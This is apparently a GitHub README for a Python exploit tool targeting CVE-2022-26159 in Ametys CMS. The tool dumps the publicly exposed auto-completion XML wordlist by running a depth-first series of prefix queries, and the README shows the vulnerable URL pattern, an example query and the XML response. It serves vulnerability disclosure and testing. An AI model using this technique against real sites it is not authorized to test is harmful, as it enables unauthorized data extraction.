# CVE-2022-26159-Ametys-Autocompletion-XML

<p align="center">
    A python exploit to automatically dump all the data stored by the auto-completion plugin of Ametys CMS to a local sqlite database file.
    <br>
    <img alt="GitHub release (latest by date)" src="https://img.shields.io/github/v/release/p0dalirius/CVE-2022-26159-Ametys-Autocompletion-XML">
    <a href="https://twitter.com/intent/follow?screen_name=podalirius_" title="Follow"><img src="https://img.shields.io/twitter/follow/podalirius_?label=Podalirius&style=social"></a>
    <a href="https://www.youtube.com/c/Podalirius_?sub_confirmation=1" title="Subscribe"><img alt="YouTube Channel Subscribers" src="https://img.shields.io/youtube/channel/subscribers/UCF_x5O7CSfr82AfNVTKOv_A?style=social"></a>
    <br>
</p>


![](.github/example.png)

## Features

 - [x] Automatic detection of maximum results returned by the autocompletion plugin.
 - [x] Depth first search to dump all the results.
 - [x] Output log file.

## Usage

```
$ ./CVE-2022-26159-Ametys-Autocompletion-XML.py -h
CVE-2022-26159-Ametys-Autocompletion-XML v1.1 - by @podalirius

usage: CVE-2022-26159-Ametys-Autocompletion-XML.py [-h] -t TARGET [-H HEADERS] [-k] [-v | -q] [--no-colors]

Description message

optional arguments:
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
                        arg1 help message
  -H HEADERS, --header HEADERS
                        Specify HTTP headers to use in requests. (e.g., --header "Header1: Value1" --header "Header2: Value2")
  -k, --insecure        Disable SSL/TLS warnings and certificate verification.
  -v, --verbose         Verbose mode. (default: False)
  -q, --quiet           Quiet mode. (default: False)
  --no-colors           Disables colored output. (default: False)

```

## Technical details

The autocompletion plugin in Ametys CMS <= 4.4.9 exposes publicly an XML file containing a wordlist at the following address:

```
https://domain.tld/plugins/web/service/search/auto-completion/domain/en.xml
```

To perform a request on this database, an attacker just needs to type the start of the word in the `q` (query) parameter:

```
https://domain.tld/plugins/web/service/search/auto-completion/domain/en.xml?q=adm
```

And the auto-completion plugin returns the first 10 matching words starting with `adm` (from the query) in an XML file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<auto-completion>
    <item>administrateur</item>
    <item>administrateurs</item>
    <item>administratif</item>
    <item>administratifs</item>
    <item>administration</item>
    <item>administrations</item>
    <item>administrative</item>
    <item>administratives</item>
    <item>administres</item>
    <item>admission</item>
</auto-completion>
```

With this in mind, an attacker just needs to perform a [depth first search on the API](https://podalirius.net/en/articles/scraping-search-apis-depth-first-style/) to extract all the content of it.

## Contributing

Pull requests are welcome. Feel free to open an issue if you want to add other features.

## References
 - https://podalirius.net/en/cves/2022-26159/
 - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-26159
 - https://issues.ametys.org/browse/CMS-10973
 - https://podalirius.net/en/articles/scraping-search-apis-depth-first-style/
